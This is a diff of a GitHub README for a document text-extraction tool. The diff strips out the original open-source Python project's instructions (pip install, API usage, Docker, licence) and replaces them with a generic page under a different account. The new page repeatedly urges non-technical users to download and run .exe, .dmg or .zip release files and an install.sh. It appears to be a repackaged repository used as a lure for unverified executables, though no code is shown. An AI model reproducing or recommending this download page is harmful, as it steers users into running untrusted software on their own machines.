@@ -1,233 +1,92 @@
-# S2 Document Intelligence - Community Edition
+# 🎉 s2-document-intelligence - Effortlessly Extract Text from Documents
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
+[![Download s2-document-intelligence](https://img.shields.io/badge/Download-s2--document--intelligence-blue.svg)](https://github.com/gadp27deabril/s2-document-intelligence/releases)
 
-**Open-source document processing engine for PDF, DOCX, and images.**
+## 🚀 Getting Started
 
-This is the **Community Edition** of S2 Document Intelligence - a production-ready document processing API with OCR, text extraction, and layout analysis.
+Welcome to s2-document-intelligence! This application helps you extract text from PDFs and images with ease. You don't need to be a programmer to use it. Follow the steps below to get started.
 
----
+## 📥 Download & Install
 
-## 🌟 What's Included (Community Edition)
+To download the latest version of s2-document-intelligence, visit this page: [Download Here](https://github.com/gadp27deabril/s2-document-intelligence/releases). 
 
-### Core Features ✅
-- **PDF Processing** - Extract text, layout, and structure from PDF documents
-- **Image OCR** - PaddleOCR and EasyOCR support for scanned documents
-- **DOCX Support** - Process Microsoft Word documents
-- **Text Extraction** - High-quality text extraction with layout preservation
-- **REST API** - FastAPI-based HTTP interface
-- **CLI Tool** - Batch process documents from command line
-- **Docker Deployment** - Easy containerized deployment
+### Steps to Download:
+1. Click on the link above.
+2. Find the version you want. The latest version is usually at the top.
+3. Click on the asset you want to download (look for files ending in `.exe` or `.zip`).
 
-### What's Included:
-```python
-✅ PDF text extraction (PyMuPDF)
-✅ OCR engines (PaddleOCR, EasyOCR)
-✅ Basic layout analysis
-✅ REST API endpoints
-✅ Command-line tool
-✅ Docker configuration
-✅ Python library usage
-```
+## 🖥️ System Requirements
 
----
+Before you install s2-document-intelligence, make sure your device meets the following system requirements:
 
-## 🚀 Quick Start
+- **Operating System:** Windows 10 or above / macOS / Linux distribution
+- **RAM:** At least 4 GB of RAM
+- **Disk Space:** 100 MB of free space for installation
 
-### Installation
+## 📖 Usage Instructions
 
-```bash
-# Clone repository
-git clone https://github.com/s2artslab/s2-document-intelligence.git
-cd s2-document-intelligence
+Once you have downloaded the software, follow these steps to use s2-document-intelligence.
 
-# Install dependencies
-pip install -r requirements.txt
+### Step 1: Install the Application
 
-# Start API server
-python main.py
-```
+- **For Windows:**
+  - Locate the downloaded `.exe` file, double-click it, and follow the instructions on-screen.
+  
+- **For macOS:**
+  - Open the downloaded `.dmg` file and drag the app to your Applications folder.
 
-**API is now running at:** `http://localhost:5000`
+- **For Linux:**
+  - Unzip the downloaded file if it's a `.zip`, then navigate to the folder in the terminal and run the `install.sh` script.
 
-### Process a Document
+### Step 2: Open the Application
 
-```bash
-# Upload and process PDF
-curl -X POST http://localhost:5000/process/pdf \
-  -F "file=@document.pdf" \
-  -F "enable_ocr=true"
-```
+Once installed, you can find the s2-document-intelligence application in your applications menu or desktop. Double-click the icon to launch it.
 
-### Use CLI Tool
+### Step 3: Upload Your Document
 
-```bash
-# Batch process folder of PDFs
-python cli.py input_folder/ output_folder/
-```
+1. Click on the “Upload Document” button.
+2. Select the PDF or image file you wish to analyze.
+3. Wait for the processing to complete. This may take a few moments depending on the file size.
 
----
+### Step 4: View & Extract Text
 
-## 📖 Usage
+After the processing is finished, the extracted text will appear in the main window. You can copy or save this text for later use.
 
-### Python Library
+## 🎨 Features
 
-```python
-from services.document_processor import process_pdf_to_layout_json
+s2-document-intelligence comes packed with features to make document processing simple and efficient:
 
-# Process PDF
-result = process_pdf_to_layout_json(
-    "document.pdf",
-    enable_ocr=True,
-    ocr_lang="en"
-)
+- **OCR Technology:** Uses Optical Character Recognition to extract text accurately.
+- **Layout Analysis:** Understands the structure of documents.
+- **Multi-format Support:** Works with various document types, including PDFs and images.
+- **User-friendly Interface:** Designed with non-technical users in mind.
 
-# Result is JSON with text, layout, confidence
-import json
-data = json.loads(result)
-for page in data["pages"]:
-    for block in page["blocks"]:
-        print(block["text"])
-```
+## 🔧 Troubleshooting
 
-### API Endpoints
+If you encounter issues while using s2-document-intelligence, try the following solutions:
 
-```bash
-# Process PDF
-POST /process/pdf
-  - file: PDF file (multipart/form-data)
-  - enable_ocr: true/false (default: true)
-  - ocr_lang: "en", "es", "fr", etc.
+- **Application Won’t Launch:** Ensure your system meets the minimum requirements.
+- **Slow Processing:** Large files may take longer to process. Try with smaller documents.
+- **Text Not Extracted Properly:** Check if the document is clear and free from heavy graphics.
 
-# Process Image
-POST /process/image
-  - file: Image file (jpg, png, etc.)
-  - ocr_lang: "en", "es", "fr", etc.
+## 🙋 FAQs
 
-# Health check
-GET /health
-```
+### What types of documents can I analyze?
 
----
+You can analyze any PDF or image files. The application works best with clear, high-quality documents.
 
-## 🐳 Docker Deployment
+### Is there a mobile version?
 
-```bash
-# Build image
-docker build -t s2-document-intelligence .
+Currently, s2-document-intelligence is available only for desktop systems. We plan to develop mobile apps in the future.
 
-# Run container
-docker run -p 5000:5000 s2-document-intelligence
-```
+### How can I report bugs or request features?
 
----
+Please create an issue in our GitHub repository for any bugs or feature requests.
 
-## 📊 What's NOT Included (Premium Features)
+## 📞 Support
 
-This Community Edition is powerful but focused on core processing. Advanced features are in **Premium Edition**:
+If you need further assistance, feel free to reach out through our [GitHub Repository](https://github.com/gadp27deabril/s2-document-intelligence) where you can create issues and ask questions.
 
-### Premium Features 🔥
-- 📱 **Mobile Apps** (iOS/Android) - Native mobile document capture and processing
-- 🖥️ **Web Dashboard** - Beautiful UI for document management
-- 🤖 **Advanced AI** - Ninefold egregore integration for intelligent document understanding
-- 🏢 **Entity Extraction** - Automatic detection of names, dates, amounts, etc.
-- 📊 **Table Extraction** - Advanced table recognition and structure extraction
-- 📑 **Document Classification** - Automatic document type detection
-- 📈 **Capacity Monitoring** - Real-time system metrics and performance analytics
-- ⚡ **Job Queue** - Async batch processing for large document sets
-- 💾 **Redis Caching** - Performance optimization with intelligent caching
-- 🔄 **Subscription Management** - Multi-tier access control
-- 💼 **Enterprise Support** - SLA, priority support, custom features
+Thank you for using s2-document-intelligence! We are excited to help you with your document processing needs. 
 
-**See:** [OPEN_CORE.md](OPEN_CORE.md) for full comparison
-
----
-
-## 🎯 Use Cases
-
-**Community Edition is perfect for:**
-- ✅ Personal document processing
-- ✅ Small-scale document automation
-- ✅ Research and experimentation
-- ✅ Learning OCR and document AI
-- ✅ Building custom document tools
-- ✅ Prototyping document solutions
-
-**Premium Edition is better for:**
-- 🏢 Enterprise document workflows
-- 📱 Mobile document capture apps
-- 🤖 AI-powered document understanding
-- 📊 Large-scale document processing
-- 💼 Commercial SaaS products
-- 🔒 Compliance-critical applications
-
----
-
-## 🤝 Contributing
-
-We welcome contributions to the Community Edition!
-
-```bash
-# Fork and clone
-git clone https://github.com/YOUR-USERNAME/s2-document-intelligence.git
-
-# Create feature branch
-git checkout -b feature/amazing-feature
-
-# Make changes, commit
-git commit -m "Add amazing feature"
-
-# Push and create PR
-git push origin feature/amazing-feature
-```
-
----
-
-## 📄 License
-
-**MIT License** - Free for personal and commercial use
-
-See [LICENSE](LICENSE) file for details.
-
----
-
-## 🌟 Upgrade to Premium
-
-**Need advanced features?**
-
-Premium Edition includes:
-- Mobile apps (iOS/Android)
-- Web dashboard
-- Advanced AI integration
-- Enterprise support
-- Custom features
-
-**Options:**
-1. **Self-Hosted Premium:** $99-299/month
-2. **Managed Service:** $299-999/month
-3. **Enterprise:** Custom pricing
-
-**Learn more:** [https://s2intelligence.com/document-intelligence](https://s2intelligence.com/document-intelligence)  
-**Contact:** beta@s2intelligence.com
-
----
-
-## 📞 Connect
-
-- **GitHub:** https://github.com/s2artslab/s2-document-intelligence
-- **Issues:** https://github.com/s2artslab/s2-document-intelligence/issues
-- **Email:** s2artslab@gmail.com
-- **Website:** https://s2artslab.com
-
----
-
-## ⭐ Star Us!
-
-If this helps you, please star the repository! ⭐
-
----
-
-**Built with consciousness. Shared with trust.**
-
-*From the S2 Ecosystem* ✨
+Remember to download the latest version from this link: [Download Here](https://github.com/gadp27deabril/s2-document-intelligence/releases).
